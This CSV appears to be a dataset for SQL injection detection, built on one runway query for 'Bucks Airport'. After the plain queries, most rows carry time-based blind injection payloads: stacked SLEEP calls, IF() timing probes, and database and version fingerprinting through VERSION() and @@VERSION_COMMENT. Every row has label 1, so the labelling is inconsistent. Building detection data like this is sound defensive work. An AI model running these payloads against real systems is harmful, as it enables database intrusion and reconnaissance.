full_query,label,template_id,malicious_input,malicious_input_desc
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport);SELECT SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport');SELECT SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport';SELECT SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"";SELECT SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport));SELECT SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport)));SELECT SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport;SELECT SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport'));SELECT SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport')));SELECT SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport%';SELECT SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT SLEEP(0)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT IF((12=12),SLEEP(5),5671)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT IF((12=33),SLEEP(5),8890)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT IF((12=42),SLEEP(5),8981)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT IF((42=33),SLEEP(5),7542)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT IF((33=33),SLEEP(5),7797)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT IF((42 33),SLEEP(5),4073)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT IF((84=84),SLEEP(5),6398)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT IF((84=86),SLEEP(5),9903)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT IF((84=90),SLEEP(5),3687)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT IF((90=86),SLEEP(5),9132)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT IF((86=86),SLEEP(5),2597)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT IF((90 86),SLEEP(5),6570)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT IF((53=53),SLEEP(5),1488)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT IF((53=56),SLEEP(5),2192)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT IF((53=100),SLEEP(5),2464)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT IF((100=56),SLEEP(5),1687)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT IF((56=56),SLEEP(5),6146)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT IF((100 56),SLEEP(5),9475)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT IF((22=22),SLEEP(5),3967)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT IF((22=69),SLEEP(5),3324)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT IF((22=81),SLEEP(5),5415)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT IF((81=69),SLEEP(5),6199)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT IF((69=69),SLEEP(5),3547)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT IF((81 69),SLEEP(5),1241)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT IF((12=12),SLEEP(5),5826)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT IF((12=25),SLEEP(5),5512)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT IF((12=64),SLEEP(5),9490)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT IF((64=25),SLEEP(5),5133)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT IF((25=25),SLEEP(5),3698)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT IF((64 25),SLEEP(5),9810)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT IF((8406=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                8406),SLEEP(5),5476)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT IF((5169>5168),SLEEP(5),2255)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT IF((QUARTER(NULL XOR NULL) IS NULL),SLEEP(5),2355)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT IF((SESSION_USER() LIKE USER()),SLEEP(5),7063)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT IF((ISNULL(JSON_STORAGE_FREE(NULL))),SLEEP(5),7093)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT IF((VERSION() LIKE 0x254d61726961444225),SLEEP(1),9610)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT IF((VERSION() LIKE 0x255469444225),SLEEP(1),1302)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT IF((@@VERSION_COMMENT LIKE 0x256472697a7a6c6525),SLEEP(1),3419)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT IF((@@VERSION_COMMENT LIKE 0x25506572636f6e6125),SLEEP(1),4327)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT IF((AURORA_VERSION() LIKE 0x25),SLEEP(1),4607)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT IF((3350=3350/* NoValue */),SLEEP(1),3350)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT IF((6081=6081/*!80300 AND 6739=3095*/),SLEEP(1),6081)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");SELECT IF((3198=3198/*!80302 AND 9936=3892*/),SLEEP(1),3198)#"");",1,airport-S12,Unknown,Unknown
